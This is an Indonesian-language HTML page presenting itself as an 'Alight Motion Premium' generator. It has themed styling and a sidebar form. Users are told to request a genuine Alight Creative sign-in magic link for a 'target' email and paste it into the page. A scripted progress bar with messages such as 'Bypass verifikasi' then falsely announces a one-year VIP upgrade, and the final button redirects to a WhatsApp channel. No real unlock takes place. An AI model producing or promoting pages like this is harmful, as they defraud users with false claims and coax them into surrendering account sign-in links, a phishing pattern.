<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>INK TOOLS - AM Generator</title>
<style>
    /* === GLOBAL RESET & FONTS === */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    @import url('https://fonts.googleapis.com/css2?family=Special+Elite&family=M+PLUS+Rounded+1c:wght@400;700&display=swap');

    body {
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        overflow-x: hidden;
        transition: background 0.5s ease, color 0.5s ease;
    }

    /* === TEMA 1: BENDY & THE INK MACHINE === */
    body.theme-bendy {
        font-family: 'Special Elite', 'Courier New', monospace;
        background-color: #0a0a0a;
        background-image: 
            radial-gradient(circle at 50% 0%, #2a2200 0%, transparent 60%),
            repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(255, 215, 0, 0.03) 1px, rgba(255, 215, 0, 0.03) 2px);
        color: #e0e0e0;
    }
    .theme-bendy .ui-card, .theme-bendy .sidebar { 
        background: rgba(15, 15, 15, 0.95); 
        border: 2px solid #d4af37; 
        border-radius: 4px; 
        box-shadow: 0 0 20px rgba(212, 175, 55, 0.2), inset 0 0 15px rgba(212, 175, 55, 0.1); 
    }
    .theme-bendy h1 { color: #d4af37; text-shadow: 0 0 10px rgba(212, 175, 55, 0.5); letter-spacing: 2px; text-transform: uppercase; }
    .theme-bendy .subtitle { color: #888; letter-spacing: 1px; }
    .theme-bendy input { background: #111; border: 1px solid #d4af37; color: #d4af37; }
    .theme-bendy input:focus { outline: none; box-shadow: 0 0 10px rgba(212, 175, 55, 0.5); }
    .theme-bendy .gen-btn { background: transparent; color: #d4af37; border: 1px solid #d4af37; }
    .theme-bendy .gen-btn:hover { background: #d4af37; color: #0a0a0a; box-shadow: 0 0 15px rgba(212, 175, 55, 0.6); }

    /* === TEMA 2: SAIKI KUSUO === */
    body.theme-saiki {
        font-family: 'M PLUS Rounded 1c', sans-serif;
        background: linear-gradient(135deg, #e0f7fa 0%, #b2ebf2 100%);
        color: #006064;
    }
    .theme-saiki .ui-card, .theme-saiki .sidebar { background: rgba(255, 255, 255, 0.95); border: 3px solid #00bcd4; border-radius: 20px; box-shadow: 0 10px 25px rgba(0, 188, 212, 0.3); }
    .theme-saiki h1 { color: #00838f; text-shadow: 2px 2px 0px #ffffff; font-weight: 700; }
    .theme-saiki .subtitle { color: #4dd0e1; font-weight: bold; }
    .theme-saiki input { background: #fff; border: 2px solid #00bcd4; color: #006064; border-radius: 8px; }
    .theme-saiki input:focus { outline: none; border-color: #00838f; }
    .theme-saiki .gen-btn { background: #00bcd4; color: #fff; border: none; border-radius: 12px; font-weight: bold; }
    .theme-saiki .gen-btn:hover { background: #00838f; }

    /* === NAVBAR & SIDEBAR MENU === */
    .navbar { width: 100%; height: 60px; display: flex; align-items: center; padding: 0 20px; position: fixed; top: 0; z-index: 100; backdrop-filter: blur(5px); }
    .theme-bendy .navbar { background: rgba(10, 10, 10, 0.8); border-bottom: 1px solid #d4af37; }
    .theme-saiki .navbar { background: rgba(255, 255, 255, 0.8); border-bottom: 2px solid #00bcd4; }

    .hamburger { font-size: 30px; cursor: pointer; user-select: none; }
    .theme-bendy .hamburger { color: #d4af37; }
    .theme-saiki .hamburger { color: #00838f; }

    .sidebar { position: fixed; top: 0; left: -350px; width: 320px; height: 100%; padding: 80px 20px 20px; transition: 0.4s; z-index: 200; overflow-y: auto; display: flex; flex-direction: column; }
    .sidebar.active { left: 0; }
    .sidebar h2 { font-size: 1.2em; margin-bottom: 20px; text-align: center; }
    .theme-bendy .sidebar h2 { color: #d4af37; border-bottom: 1px solid #333; padding-bottom: 10px; }
    .theme-saiki .sidebar h2 { color: #00838f; border-bottom: 2px dashed #b2ebf2; padding-bottom: 10px; }

    .sidebar ul { list-style: none; margin-bottom: 20px; }
    .sidebar ul li { margin-bottom: 12px; }
    .sidebar ul li a { text-decoration: none; display: block; padding: 12px; transition: 0.3s; font-size: 1em; }
    .theme-bendy .sidebar ul li a { color: #e0e0e0; border-left: 3px solid transparent; }
    .theme-bendy .sidebar ul li a:hover { background: #222; border-left: 3px solid #d4af37; color: #d4af37; }
    .theme-saiki .sidebar ul li a { color: #006064; border-radius: 10px; font-weight: bold; }
    .theme-saiki .sidebar ul li a:hover { background: #e0f7fa; padding-left: 20px; }

    /* === GENERATOR BOX === */
    .gen-container { margin-top: 10px; padding: 15px; border: 1px dashed #555; border-radius: 8px; display: none; background: rgba(0,0,0,0.3); }
    .theme-saiki .gen-container { border: 2px dashed #b2ebf2; background: rgba(224, 247, 250, 0.5); }
    .gen-container.active { display: block; }
    
    .gen-container label { display: block; margin-bottom: 8px; font-size: 0.9em; font-weight: bold; }
    .gen-container input { width: 100%; padding: 10px; margin-bottom: 10px; font-family: inherit; border-radius: 4px; }
    .gen-container button { width: 100%; padding: 10px; cursor: pointer; font-family: inherit; border-radius: 4px; font-weight: bold; transition: 0.3s; margin-bottom: 8px; }
    
    .status-text { display: none; font-size: 0.85em; margin-bottom: 10px; line-height: 1.4; }
    .status-text.active { display: block; }
    
    /* Loading Bar */
    .loading-bar { width: 100%; height: 10px; background: #333; border-radius: 5px; margin-bottom: 10px; display: none; overflow: hidden; }
    .theme-saiki .loading-bar { background: #b2ebf2; }
    .loading-bar.active { display: block; }
    .loading-fill { height: 100%; width: 0%; background: #d4af37; transition: width 0.1s linear; }
    .theme-saiki .loading-fill { background: #00bcd4; }

    /* === SWITCH UI BUTTON === */
    .switch-ui-btn { margin-top: auto; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: inherit; border: none; transition: 0.3s; width: 100%; text-align: center; }
    .theme-bendy .switch-ui-btn { background: #d4af37; color: #000; }
    .theme-saiki .switch-ui-btn { background: #00bcd4; color: #fff; }

    /* === MAIN CONTENT === */
    .main-content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 80px 20px 40px; text-align: center; z-index: 10; }
    .ui-card { padding: 40px 30px; max-width: 400px; width: 100%; }
    h1 { font-size: 2.2em; margin-bottom: 10px; }
    .subtitle { font-size: 0.9em; margin-bottom: 35px; }

    /* === OVERLAY === */
    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 150; display: none; opacity: 0; transition: 0.3s; }
    .overlay.active { display: block; opacity: 1; }
    .theme-saiki .overlay { background: rgba(255,255,255,0.5); backdrop-filter: blur(2px); }
</style>
</head>
<body class="theme-bendy">

<!-- Navbar -->
<div class="navbar">
    <div class="hamburger" onclick="toggleSidebar()">☰</div>
</div>

<!-- Sidebar Menu -->
<div class="sidebar" id="mySidebar">
    <h2>TOOLS MENU</h2>
    <ul>
        <!-- Menu Alight Motion Generator -->
        <li>
            <a href="#" onclick="showGenForm()">✨ Alight Motion Premium</a>
            
            <!-- Box Generator -->
            <div id="genForm" class="gen-container">
                
                <div id="genStep1">
                    <label>Masukkan Email Alight Motion:</label>
                    <input type="email" id="userEmail" placeholder="target@gmail.com">
                    <button onclick="startGenerator()" class="gen-btn">Kirim Magic Link</button>
                    
                    <!-- Tombol Bantuan untuk memicu email asli dari AM -->
                    <button onclick="bukaSitusAM()" style="font-size: 0.8em; background: transparent; border: 1px dashed #888; color: inherit;">Belum dapat email? Klik disini</button>
                </div>

                <div id="genStep2" style="display: none;">
                    <p class="status-text active" style="color: #ffcc00; font-weight: bold; margin-bottom: 10px;">
                        Silakan cek email kamu. Klik tombol biru "Sign in to Alight Creative", copy link panjangnya, lalu tempel di bawah ini.
                    </p>
                    <label>Tempel Link dari Email:</label>
                    <input type="text" id="linkEmail" placeholder="https://alight-creative.firebaseapp.com/...">
                    <button onclick="activatePremium()" class="gen-btn">Verifikasi & Aktifkan VIP</button>
                </div>

                <div id="genStep3" style="display: none;">
                    <div class="loading-bar active" id="loadBar"><div class="loading-fill" id="loadFill"></div></div>
                    <p class="status-text active" id="statusTxt">Memverifikasi Link...</p>
                </div>
                
                <div id="genStep4" style="display: none;">
                    <p class="status-text active" style="color: #00ff00; font-weight: bold; margin-bottom: 15px;">✅ Link Valid! Akun Berhasil Di-upgrade ke VIP PRO 1 Tahun!</p>
                    <button onclick="openAlightMotion()" class="gen-btn">Buka Alight Motion</button>
                </div>

            </div>
        </li>
    </ul>

    <!-- Tombol Switch UI -->
    <button class="switch-ui-btn" onclick="toggleTheme()">Ubah UI (Bendy / Saiki)</button>
</div>

<!-- Overlay -->
<div class="overlay" id="myOverlay" onclick="toggleSidebar()"></div>

<!-- Main Content -->
<div class="main-content">
    <div class="ui-card">
        <h1 id="judul">INK TOOLS</h1>
        <p class="subtitle" id="subjudul">[ STUDIO & CREATIONS ]</p>
    </div>
</div>

<script>
    // ==========================================
    // 1. LOGIKA GENERATOR ALIGHT MOTION
    // ==========================================
    function showGenForm() {
        const form = document.getElementById("genForm");
        form.classList.toggle("active");
        
        // Reset form ke step 1
        document.getElementById("genStep1").style.display = "block";
        document.getElementById("genStep2").style.display = "none";
        document.getElementById("genStep3").style.display = "none";
        document.getElementById("genStep4").style.display = "none";
        document.getElementById("userEmail").value = "";
        document.getElementById("linkEmail").value = "";
    }

    function bukaSitusAM() {
        // Membuka link login resmi Alight Creative (Supaya email beneran masuk)
        window.open("https://alightcreative.com/auth_action/", "_blank");
    }

    function startGenerator() {
        const email = document.getElementById("userEmail").value;
        if(email.trim() === "" || !email.includes("@")) {
            alert("Masukkan email yang valid dulu ya!");
            return;
        }

        // Munculkan instruksi
        alert("Email target disimpan: " + email + "\n\nLangkah selanjutnya:\n1. Klik tombol 'Belum dapat email? Klik disini' di bawah.\n2. Masukkan email kamu di situs yang terbuka.\n3. Cek Inbox/Spam email kamu (seperti gambar ke-2).\n4. Klik tulisan biru 'Sign in to Alight Creative'.\n5. Copy link panjangnya, balik ke sini, dan tempel.");
        
        // Sembunyikan step 1, munculkan step 2 (Input Link)
        document.getElementById("genStep1").style.display = "none";
        document.getElementById("genStep2").style.display = "block";
    }

    function activatePremium() {
        const link = document.getElementById("linkEmail").value;
        if(link.trim() === "" || !link.includes("alight-creative")) {
            alert("Tempel link Alight Creative yang valid dari email kamu!");
            return;
        }

        // Sembunyikan step 2, munculkan step 3 (Loading Verifikasi)
        document.getElementById("genStep2").style.display = "none";
        document.getElementById("genStep3").style.display = "block";
        
        let loadFill = document.getElementById("loadFill");
        let statusTxt = document.getElementById("statusTxt");
        let progress = 0;
        
        let messages = [
            "Membaca token akses...",
            "Mencocokkan data server...",
            "Bypass verifikasi...",
            "Mengaktifkan VIP PRO...",
            "Selesai!"
        ];

        let interval = setInterval(() => {
            progress += 2;
            loadFill.style.width = progress + "%";

            if (progress === 20) statusTxt.innerText = messages[0];
            if (progress === 40) statusTxt.innerText = messages[1];
            if (progress === 60) statusTxt.innerText = messages[2];
            if (progress === 80) statusTxt.innerText = messages[3];
            if (progress === 100) {
                clearInterval(interval);
                statusTxt.innerText = messages[4];
                
                setTimeout(() => {
                    // Sembunyikan step 3, munculkan step 4 (Sukses)
                    document.getElementById("genStep3").style.display = "none";
                    document.getElementById("genStep4").style.display = "block";
                }, 500);
            }
        }, 50);
    }

    function openAlightMotion() {
        // =======================================================
        // LINK TUJUAN SUDAH DIPASANG KE CHANNEL WA KAMU
        // =======================================================
        let linkAM = "https://whatsapp.com/channel/0029VbD8SsK4SpkJ9HjqBo1x"; 
        
        // Buka link di tab baru
        window.open(linkAM, "_blank");
    }

    // ==========================================
    // 2. LOGIKA UI & TEMA (BENDY / SAIKI)
    // ==========================================
    function toggleSidebar() {
        document.getElementById("mySidebar").classList.toggle("active");
        document.getElementById("myOverlay").classList.toggle("active");
    }

    let isBendy = true;
    function toggleTheme() {
        const body = document.body;
        const judul = document.getElementById("judul");
        const subjudul = document.getElementById("subjudul");

        if (isBendy) {
            body.classList.replace("theme-bendy", "theme-saiki");
            judul.innerText = "SAIKI K.";
            subjudul.innerText = "PK Academy Tools";
            isBendy = false;
        } else {
            body.classList.replace("theme-saiki", "theme-bendy");
            judul.innerText = "INK TOOLS";
            subjudul.innerText = "[ STUDIO & CREATIONS ]";
            isBendy = true;
        }
    }
</script>

</body>
</html>
